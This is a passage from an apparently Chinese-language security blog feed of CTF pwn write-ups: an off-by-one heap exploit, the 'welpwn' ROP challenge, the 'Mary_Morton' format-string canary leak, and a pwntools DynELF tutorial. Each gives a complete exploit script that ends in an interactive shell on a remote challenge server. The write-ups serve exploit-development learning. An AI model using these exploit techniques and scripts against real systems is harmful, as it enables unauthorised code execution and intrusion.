class="string">'200000'</span>,<span class="string">'bill'</span>,<span class="string">'200000'</span>,<span class="string">"this is bill"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line"><span class="comment">############################set first b00k to fake b00k############################</span></span><br><span class="line"></span><br><span class="line">Change(<span class="string">"A"</span>*<span class="number">30</span>+<span class="string">'B'</span>+<span class="string">'C'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#############################get second b00k addr(get libc)#######################</span></span><br><span class="line">Print()</span><br><span class="line">p.recvuntil(<span class="string">"Name: "</span>)</span><br><span class="line">second_name_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00'</span>+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"second_name_addr="</span>+hex(second_name_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc_base_addr=second_name_addr<span class="number">-0x5c2010</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base_addr="</span>+hex(libc_base_addr)</span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line"><span class="comment">################################get libc addr end########################################</span></span><br><span class="line">libc=ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] + libc_base_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</span><br><span class="line">free_hook=libc.symbols[<span class="string">"__free_hook"</span>]+libc_base_addr</span><br><span class="line">binsh_addr = libc.search(<span class="string">'/bin/sh'</span>).next() + libc_base_addr</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">####################################get shell#########################################</span></span><br><span class="line">payload = p64(binsh_addr) + p64(free_hook)  <span class="comment">#second_b00k_name=bin_sh    second_b00k_discription=free_hook</span></span><br><span class="line">Edit(<span class="string">'1'</span>,payload)</span><br><span class="line">payload=p64(system_addr)   <span class="comment">#free_hook--&gt;system_addr</span></span><br><span class="line">Edit(<span class="string">'2'</span>,payload)</span><br><span class="line">Delete(<span class="string">'2'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「九层台」的原创文章，遵循 CC <span class="number">4.0</span> BY-SA 版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https://blog.csdn.net/qq_38204481/article/details/<span class="number">81320898</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;off-by-one漏洞原理&quot;&gt;&lt;a href=&quot;#off-by-one漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;off by one漏洞原理&quot;&gt;&lt;/a&gt;off by one漏洞原理&lt;/h3&gt;&lt;figure class=&quot;highlight 
      
    
    </summary>
    
      <category term="ctf-wiki" scheme="http://yoursite.com/categories/ctf-wiki/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>welpwn</title>
    <link href="http://yoursite.com/2019/09/19/welpwn/"/>
    <id>http://yoursite.com/2019/09/19/welpwn/</id>
    <published>2019-09-19T08:03:30.233Z</published>
    <updated>2019-09-19T08:12:30.091Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞点"><a href="#0x01-漏洞点" class="headerlink" title="0x01 漏洞点"></a>0x01 漏洞点</h3><p><img src="https://img2018.cnblogs.com/blog/1623965/201905/1623965-20190511155310748-1506011649.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+<span class="number">0</span>h] [rbp<span class="number">-400</span>h]</span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome to RCTF\n"</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  echo((__int64)&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall echo(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s2[<span class="number">16</span>]; // [rsp+<span class="number">10</span>h] [rbp<span class="number">-10</span>h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !strcmp(<span class="string">"ROIS"</span>, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">"RCTF&#123;Welcome&#125;"</span>, s2);</span><br><span class="line">    puts(<span class="string">" is not flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> printf(<span class="string">"%s"</span>, s2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">read最多<span class="number">0x400</span>字节，echo会将这些字节拷贝到s2数组中，超过<span class="number">0x18</span>字节即会覆盖返回地址。</span><br></pre></td></tr></table></figure><h3 id="0x02-攻击"><a href="#0x02-攻击" class="headerlink" title="0x02 攻击"></a>0x02 攻击</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">由于echo拷贝时，会被\x00截断，所以不能连续覆盖多个地址来rop，</span><br><span class="line"></span><br><span class="line">在echo函数ret处下断点，调试可以发现echo返回地址下方即为read时的buf处</span><br><span class="line"></span><br><span class="line">所以可以覆盖返回地址为pop pop pop pop ret指令地址，返回时弹出<span class="number">0x18</span>个填充字节和返回地址,返回到buf+<span class="number">0x20</span>处</span><br><span class="line"></span><br><span class="line">在buf+<span class="number">0x20</span>处构造rop，先泄露libc基地址，返回到start</span><br><span class="line"></span><br><span class="line">重新执行，输入使之执行system(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">下次遇到栈溢出题目一定要多调试，注意栈的结构。</span><br></pre></td></tr></table></figure><h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process('./welpwn')</span></span><br><span class="line">sh=remote(<span class="string">'111.198.29.45'</span>,<span class="number">47606</span>)</span><br><span class="line">elf=ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc=ELF(<span class="string">'./libc64-2.19.so'</span>)</span><br><span class="line">poprdi_ret=<span class="number">0x4008a3</span></span><br><span class="line">pop4_ret=<span class="number">0x40089c</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line">start=<span class="number">0x400630</span></span><br><span class="line">sh.recvuntil(<span class="string">'Welcome to RCTF\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'b'</span>*<span class="number">8</span>+p64(pop4_ret)</span><br><span class="line">payload+=p64(poprdi_ret)+p64(write_got)+p64(puts_plt)+p64(start)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">sh.recv(<span class="number">3</span>)</span><br><span class="line">write_adr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'write_adr: '</span>+hex(write_adr)</span><br><span class="line"><span class="comment">#libc_base=write_adr-libc.symbols['write']</span></span><br><span class="line">libc_base=write_adr<span class="number">-0x0f72b0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base: '</span>+hex(libc_base)</span><br><span class="line">system_adr=libc_base+<span class="number">0x045390</span></span><br><span class="line">binsh_adr=libc_base+<span class="number">0x18cd57</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">system_adr=libc_base+libc.symbols['system']</span></span><br><span class="line"><span class="string">binsh_adr=libc_base+libc.search('/bin/sh\x00').next()</span></span><br><span class="line"><span class="string">sh.recvuntil('Welcome to RCTF\n')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'b'</span>*<span class="number">8</span>+p64(pop4_ret)</span><br><span class="line">payload+=p64(poprdi_ret)+p64(binsh_adr)+p64(system_adr)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-漏洞点&quot;&gt;&lt;a href=&quot;#0x01-漏洞点&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞点&quot;&gt;&lt;/a&gt;0x01 漏洞点&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/162
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Mary_Morton</title>
    <link href="http://yoursite.com/2019/09/19/Mary_Morton/"/>
    <id>http://yoursite.com/2019/09/19/Mary_Morton/</id>
    <published>2019-09-19T07:48:13.501Z</published>
    <updated>2019-09-19T08:02:48.177Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞点"><a href="#0x01-漏洞点" class="headerlink" title="0x01 漏洞点"></a>0x01 漏洞点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析能够发现程序有两处漏洞，一处是栈溢出，一处是格式化字符串漏洞</span><br></pre></td></tr></table></figure><p><img src="https://y4fbeifen-1251019139.cos.ap-hongkong.myqcloud.com/wp-content/uploads/2019/09/010328g66w6zflstjlzljl.png" alt></p><p><img src="https://y4fbeifen-1251019139.cos.ap-hongkong.myqcloud.com/wp-content/uploads/2019/09/010236ts3tsjljtjcncwtv.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">程序有Canary保护，这个保护就是在栈上面抱一个标志canary，在程序执行结束后，会检测这个标志是否发生变化，若发生变化则程序报错，这个canary通常是在ebp的上面，同一个程序在每一次执行时这个标志canary是不同的，但是在执行过程中这个标志是不会发生变化的</span><br><span class="line">所以，我们就是以利用格式化字符串来读取标志canary，然后再去利用栈溢出去执行system(<span class="string">""</span>/bin/cat ./flag<span class="string">""</span>)</span><br></pre></td></tr></table></figure><p><img src="https://y4fbeifen-1251019139.cos.ap-hongkong.myqcloud.com/wp-content/uploads/2019/09/005756klpkpzn8lkak98f5.png" alt></p><h3 id="0x02-攻击"><a href="#0x02-攻击" class="headerlink" title="0x02 攻击"></a>0x02 攻击</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先计算一下格式化字符串的偏移，偏移为<span class="number">5</span>，由于程序是<span class="number">64</span>位的，所以%x不可以使用，改用%llx</span><br></pre></td></tr></table></figure><p><img src="https://y4fbeifen-1251019139.cos.ap-hongkong.myqcloud.com/wp-content/uploads/2019/09/011618jsv00s0m2v0o20hy.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于buf的大小为<span class="number">0x90</span>,并且标志canary是在ebp的上面，也就是buf的最低处，所以标志canary的偏移就是<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="https://y4fbeifen-1251019139.cos.ap-hongkong.myqcloud.com/wp-content/uploads/2019/09/012710grzj7r237jaqo5ok.png" alt></p><h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./Mary_Morton")</span></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'54470'</span>)</span><br><span class="line">canary = <span class="string">""</span></span><br><span class="line">p.sendlineafter(<span class="string">"3. Exit the battle \n"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendline(<span class="string">"%23$p"</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">canary = p.recv(<span class="number">18</span>)</span><br><span class="line">cc = int(canary,<span class="number">16</span>)</span><br><span class="line">print(cc)</span><br><span class="line">p.sendlineafter(<span class="string">"3. Exit the battle \n"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(cc) + <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x4008DA</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-漏洞点&quot;&gt;&lt;a href=&quot;#0x01-漏洞点&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞点&quot;&gt;&lt;/a&gt;0x01 漏洞点&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>dynelf详细教程</title>
    <link href="http://yoursite.com/2019/09/19/linux%20pwn%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/09/19/linux pwn入门教程/</id>
    <published>2019-09-19T07:21:57.332Z</published>
    <updated>2019-09-19T07:46:07.237Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-DynELF简介"><a href="#0x01-DynELF简介" class="headerlink" title="0x01 DynELF简介"></a>0x01 DynELF简介</h3><h3 id="DynELF简介"><a href="#DynELF简介" class="headerlink" title="DynELF简介"></a>DynELF简介</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">在前面几篇文章中，为了降低难度，很多通过调用库函数system的题目我们实际上都故意留了后门或者提供了目标系统的libc版本。我们知道，不同版本的libc，函数首地址相对于文件开头的偏移和函数间的偏移不一定一致。所以如果题目不提供libc，通过泄露任意一个库函数地址计算出system函数地址的方法就不好使了。这就要求我们想办法获取目标系统的libc。</span><br><span class="line"></span><br><span class="line">关于远程获取libc，**pwn**tools在早期版本就提供了一个解决方案——DynELF类。DynELFl的官方文档见此：http://docs.pwntools.com/en/stable/dynelf.html，其具体的原理可以参阅文档和源码。简单地说，DynELF通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算比对出目标符号在内存中的地址。DynELF类的使用方法如下：</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       payload2leak_addr = “****” + pack(addr) + “****”</span><br><span class="line">       io.send(payload2leak_addr)</span><br><span class="line">       data = io.recv()</span><br><span class="line">       <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)</span><br><span class="line">system_addr = d.lookup(“system”, libc)</span><br><span class="line"></span><br><span class="line">使用DynELF时，我们需要使用一个leak函数作为必选参数，指向ELF文件的指针或者使用ELF类加载的目标文件至少提供一个作为可选参数，以初始化一个DynELF类的实例d。然后就可以通过这个实例d的方法lookup来搜寻libc库函数了。其中，leak函数需要使用目标程序本身的漏洞泄露出由DynELF类传入的int型参数addr对应的内存地址中的数据。且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等，我们根据这些函数的特点将其分成两部分分别进行讲解。</span><br></pre></td></tr></table></figure><h3 id="0x02-DynELF的使用—write函数"><a href="#0x02-DynELF的使用—write函数" class="headerlink" title="0x02 DynELF的使用—write函数"></a>0x02 DynELF的使用—write函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们先来看比较简单的write函数。write函数的特点在于其输出完全由其参数size决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\<span class="number">0</span>’, ‘\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。</span><br><span class="line">       我们开始分析例子~/PlaidCTF <span class="number">2013</span> ropasaurusrex/ropasaurusrex. 这个<span class="number">32</span>位程序的结构非常简单，一个有栈溢出的read，一个write。没有libc，got表里没有system，也没有int <span class="number">80</span>h/syscall</span><br></pre></td></tr></table></figure><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144155x77lrl6oaserzwlo.png.thumb.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这种情况下我们就可以使用DynELF来leaklibc，进而获取system函数在内存中的地址。</span><br><span class="line">首先我们来构建一个可以泄露任意地址的ROP链。通过测试我们可以知道栈溢出到EIP需要<span class="number">140</span>个字节，因此我们可以构造一个payload如下：</span><br><span class="line">elf = ELF(‘./ropasaurusrex’)         <span class="comment">#别忘了在脚本所在目录下放一个程序文件ropasaurusrex</span></span><br><span class="line"> </span><br><span class="line">write_addr = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line"> </span><br><span class="line">payload = “A”*<span class="number">140</span></span><br><span class="line">payload += p32(write_addr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(<span class="number">0x08048000</span>)</span><br><span class="line">payload += p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">使用payload打印出ELF文件在内存中的首地址<span class="number">0x08048000</span>，write()运行结束后返回的地址随便填写，编写脚本后发现可以正确输出结果：</span><br></pre></td></tr></table></figure><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144223jbxb1vpxrk98w9rk.png.thumb.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现在我们需要让这个payload可以被重复使用。首先我们需要改掉write函数返回的地址，以免执行完write之后程序崩溃。那么改成什么好呢？继续改成write是不行的，因为参数显然没办法继续传递。如果使用pop清除栈又会导致栈顶下降，多执行几次就会耗尽栈空间。这里我们可以把返回地址改成start段的地址</span><br></pre></td></tr></table></figure><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144300dxzrzxmvn8vubxnv.png.thumb.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这段代码是编译器添加的，用于初始化程序的运行环境后，执行完相应的代码后会跳转到程序的入口函数main运行程序代码。因此，在执行完write函数泄露数据后，我们可以返回到这里刷新一遍程序的环境，相当于是重新执行了一遍程序。现在的payload封装成leak函数如下</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       payload = <span class="string">''</span></span><br><span class="line">       payload += <span class="string">'A'</span>*<span class="number">140</span>                   <span class="comment">#padding</span></span><br><span class="line">       payload += p32(write_addr)      <span class="comment">#调用write</span></span><br><span class="line">       payload += p32(start_addr) <span class="comment">#write返回到start</span></span><br><span class="line">       payload += p32(<span class="number">1</span>)                    <span class="comment">#write第一个参数fd</span></span><br><span class="line">       payload += p32(addr)        <span class="comment">#write第二个参数buf</span></span><br><span class="line">       payload += p32(<span class="number">8</span>)                    <span class="comment">#write第三个参数size</span></span><br><span class="line">       io.sendline(payload)</span><br><span class="line">       content = io.recv()[:<span class="number">8</span>]</span><br><span class="line">       print(<span class="string">"%#x -&gt; %s"</span> %(addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">       <span class="keyword">return</span> content</span><br><span class="line">我们加了一行<span class="keyword">print</span>输出leak执行的状态，用于debug。使用DynELF泄露system函数地址，显示如下：</span><br></pre></td></tr></table></figure><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144328u04xa59a0hm74v7t.png.thumb.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">我们可以利用这个DynELF类的实例泄露read函数的真正内存地址，用于读取”/bin/sh”字符串到内存中，以便于执行system(“/bin/sh”)。最终脚本如下：</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8[/size][/align][align=left][size=3]</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">io = remote(<span class="string">'172.17.0.2'</span>, <span class="number">10001</span>)[/size][/align][align=left][size=<span class="number">3</span>]</span><br><span class="line">elf = ELF(<span class="string">'./ropasaurusrex'</span>)</span><br><span class="line"> </span><br><span class="line">start_addr = <span class="number">0x08048340</span></span><br><span class="line">write_addr = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">binsh_addr = <span class="number">0x08049000</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       payload = <span class="string">''</span></span><br><span class="line">       payload += <span class="string">'A'</span>*<span class="number">140</span>                   <span class="comment">#padding</span></span><br><span class="line">       payload += p32(write_addr)      <span class="comment">#调用write</span></span><br><span class="line">       payload += p32(start_addr)        <span class="comment">#write返回到start</span></span><br><span class="line">       payload += p32(<span class="number">1</span>)                    <span class="comment">#write第一个参数fd</span></span><br><span class="line">       payload += p32(addr)               <span class="comment">#write第二个参数buf</span></span><br><span class="line">       payload += p32(<span class="number">8</span>)                    <span class="comment">#write第三个参数size</span></span><br><span class="line">       io.sendline(payload)</span><br><span class="line">       content = io.recv()[:<span class="number">8</span>]</span><br><span class="line">       print(<span class="string">"%#x -&gt; %s"</span> %(addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">       <span class="keyword">return</span> content</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">read_addr = d.lookup(<span class="string">'read'</span>, <span class="string">'libc'</span>)</span><br><span class="line"> </span><br><span class="line">log.info(<span class="string">"system_addr = %#x"</span>, system_addr)</span><br><span class="line">log.info(<span class="string">"read_addr = %#x"</span>, read_addr)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">140</span>                          <span class="comment">#padding</span></span><br><span class="line">payload += p32(read_addr)              <span class="comment">#调用read</span></span><br><span class="line">payload += p32(system_addr)          <span class="comment">#read返回到system</span></span><br><span class="line">payload += p32(<span class="number">0</span>)                           <span class="comment">#read第一个参数fd/system返回地址，无意义</span></span><br><span class="line">payload += p32(binsh_addr)             <span class="comment">#read第二个参数buf/system第一个参数</span></span><br><span class="line">payload += p32(<span class="number">8</span>)                           <span class="comment">#read第三个参数size</span></span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x03-DynELF的使用—其他输出函数"><a href="#0x03-DynELF的使用—其他输出函数" class="headerlink" title="0x03 DynELF的使用—其他输出函数"></a>0x03 DynELF的使用—其他输出函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">除了“好说话”的write函数之外，一些专门由于处理字符串输出的函数也经常出现在各类CTF pwn题目中，比如printf, puts等。这类函数的特点是会被特殊字符影响，因此存在输出长度不固定的问题。针对这种函数，我们可以参考这篇博文：https://www.anquanke.com/post/id/<span class="number">85129</span> 对leak函数的接收输出部分进行调整。我们看一下例子~/LCTF <span class="number">2016</span>-pwn100/pwn100，其漏洞出现在sub_40068E()中。</span><br></pre></td></tr></table></figure><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144358ezazrqjemm1faaa3.png.thumb.jpg" alt></p><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144426bai3is0hmn81iga1.png.thumb.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span 